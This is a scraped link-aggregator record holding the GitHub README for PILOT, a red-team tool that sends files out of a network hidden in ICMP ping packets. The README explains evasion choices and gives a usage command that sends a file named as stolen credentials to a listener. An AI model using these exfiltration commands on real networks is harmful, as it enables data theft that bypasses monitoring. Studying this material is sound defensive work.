{"aid": "39986472", "title": "Pilot: Ping-Based Information Lookup and Outbound Transfer", "url": "https://github.com/dahvidschloss/PILOT", "domain": "github.com/dahvidschloss", "votes": 1, "user": "todsacerdoti", "posted_at": "2024-04-10 02:44:22", "comments": 0, "source_title": "GitHub - dahvidschloss/PILOT: Ping-based Information Lookup and Outbound Transfer", "source_text": "GitHub - dahvidschloss/PILOT: Ping-based Information Lookup and Outbound\nTransfer\n\nSkip to content\n\nSign in\n\n# Search code, repositories, users, issues, pull requests...\n\nSearch syntax tips\n\nSign in\n\nSign up\n\nYou signed in with another tab or window. Reload to refresh your session. You\nsigned out in another tab or window. Reload to refresh your session. You\nswitched accounts on another tab or window. Reload to refresh your session.\nDismiss alert\n\ndahvidschloss / PILOT Public\n\n  * Notifications\n  * Fork 3\n  * Star 38\n\nPing-based Information Lookup and Outbound Transfer\n\n38 stars 3 forks Branches Tags Activity\n\nStar\n\nNotifications\n\n# dahvidschloss/PILOT\n\nThis commit does not belong to any branch on this repository, and may belong\nto a fork outside of the repository.\n\n1 Branch\n\n0 Tags\n\n## Folders and files\n\nName| Name| Last commit message| Last commit date  \n---|---|---|---  \n  \n## Latest commit\n\ndahvidschlossCreate README.md8142acd \u00b7\n\n## History\n\n3 Commits  \n  \n### ATC.py\n\n|\n\n### ATC.py\n\n| Create ATC.py  \n  \n### PILOT.ps1\n\n|\n\n### PILOT.ps1\n\n| Add files via upload  \n  \n### README.md\n\n|\n\n### README.md\n\n| Create README.md  \n  \n## Repository files navigation\n\n# P.I.L.O.T - Ping-based Information Lookup and Outbound Transfer\n\nAuthor - Dahvid Schloss\n\nPilot is a simplified system designed for the stealthy transfer of files\nacross networks using ICMP (Internet Control Message Protocol) packets. This\nsystem comprises two main components: a PowerShell script for sending data and\na Python script for receiving and reassembling the data. By leveraging ICMP,\ntraditionally used for diagnostic purposes (e.g., ping), P.I.L.O.T enables the\ntransmission of data in environments where traditional methods might be\nmonitored or blocked.\n\n### 1\\. PILOT (The Sender)\n\nBreaks down files into 32-byte chunks and sends them over the network using\nICMP echo requests. It includes functionality to send a preliminary packet\ncontaining file metadata (name, type, and total chunk count) before\ntransmitting the data chunks. This is used for recompiling with the smae name\nand file type on the recieving end\n\nCustomization Options:\n\n-targetIP = Where is your listener default is 127.0.0.1\n\n-filePath = What file do you want to send\n\n-chunksize = This is the size of the file chunks. The default is 32 because layer 1-3 of ICMP packets are 32 and we are emualting MS's default behavior which is 64 byte packets. If you make it a larger chunk do not exceed 65507. Any deviation from default could result is easier dection\n\n-delay = if you want to add some its done in miliseconds, no sorry, 1000 would be 1 second for those who don't know the metrics also would be more realistic to how ping works. Default is 0 though cause who wants to wait 5900 seconds for a file\n\n### 2\\. ATC (The Reciever)\n\nListens for incoming ICMP packets, extracts the payload containing the file\ndata or metadata, and reassembles the original file based on the chunks\nreceived. Very simple no options ez pz lemon squeezy\n\nRequirements: Requires administrative privileges due to the use of raw sockets\nfor listening to ICMP packets.\n\n## How and Why It Works\n\nFile Preparation: The sender script reads the target file, breaking it into\nspecified chunk sizes. It then generates a header packet containing the file's\nmetadata.\n\nData Transmission: The sender script transmits the header packet followed by\neach data chunk as individual ICMP packets to the target IP address. Each\ntransmission's success is verified, and the process can be halted if a\ntransmission fails.\n\nData Reception: The receiver script continuously listens for ICMP packets,\nextracting the transmitted data. Upon receiving the header packet, it prepares\nto reconstruct the original file based on the total chunks expected.\n\nFile Reassembly: Once all chunks are received, the receiver script reassembles\nand saves the file using the metadata provided in the header packet.\n\nNow the reason this attack vector works is all down to how ICMP is structured.\nFirst we should look at the ICMP packet as two parts, 1 part is comprised of\nlayer 1-3 and the second part is layer 4\n\nBecuase layer 4 is involved it means there is more data involved in the packet\nthan just the where to go info.\n\nTo break down The header and data payload of the packet we have the following\nsections;\n\n  * Type (8 bits): Indicates the type of the ICMP message, e.g., Echo Request (8) or Echo Reply (0).\n\n  * Code (8 bits): Provides further information about the message type.\n\n  * Checksum (16 bits): Used for error-checking the header and data, ensuring the integrity of the message.\n\n  * Other Fields (variable): Depending on the type/code of the ICMP message, these fields may vary. For Echo Request and Echo Reply messages, these include an identifier and a sequence number, both 16 bits long.\n\n  * Data Payload: This portion of the packet is where data is included and can vary in size. In the context of Echo Request/Reply messages, this is typically where arbitrary data is placed for the echo operation.\n\nNormally this Data payload section of the packet is used by network engineers\nto determine their max MTU size for the connection and if you adjust the data\nsize using ping this data section is filled with very random data to fill the\nspace to bring it up to what ever the requested size is. By default Microsoft\nputs the alphabet in the packet so at a minimum there is 64 bytes. Now because\nits a defined strucute it means that there are plenty of tools orgnanic to\nprogramming languages to manipulate these layer 4 items like data. So what we\nare doing here is exactly that we are chunking out the files and then putting\nthem in the data section of the packet and on the distant end we are reading\nthe packet's data section.\n\n## Setup & Usage\n\n### Sender Setup\n\nOpen powershell and import the script\n\n.\\PILOT.ps1\n\nexecute the script\n\nrun-pilot -targetIP 192.168.10.10 -filePath .\\sweetsweetcreds.xls\n\n### Receiver Setup\n\nEnsure Python 3.x is installed on your system, with administrative or root\naccess to listen for ICMP packets.\n\nRun the Python receiver script. The script will automatically listen and save\nthe incoming file. You will need a new listener for each new file\n\n## Security Considerations\n\nUse P.I.L.O.T within legal and ethical boundaries. It is designed for secure\nenvironments, research, and testing purposes. Be aware of network monitoring\ntools that may detect unusual ICMP traffic.\n\n## Final Notes\n\nP.I.L.O.T represents a novel approach to data transfer, showcasing the\nflexibility of network protocols for beyond-standard uses. Whether for\npenetration testing, secure file transfer in restricted environments, or\nresearch, P.I.L.O.T offers a unique tool in the cybersecurity toolkit.\n\n## About\n\nPing-based Information Lookup and Outbound Transfer\n\n### Resources\n\nReadme\n\nActivity\n\n### Stars\n\n38 stars\n\n### Watchers\n\n1 watching\n\n### Forks\n\n3 forks\n\nReport repository\n\n## Releases\n\nNo releases published\n\n## Packages 0\n\nNo packages published\n\n## Languages\n\n  * PowerShell 65.1%\n  * Python 34.9%\n\n## Footer\n\n\u00a9 2024 GitHub, Inc.\n\nYou can\u2019t perform that action at this time.\n\n", "frontpage": false}
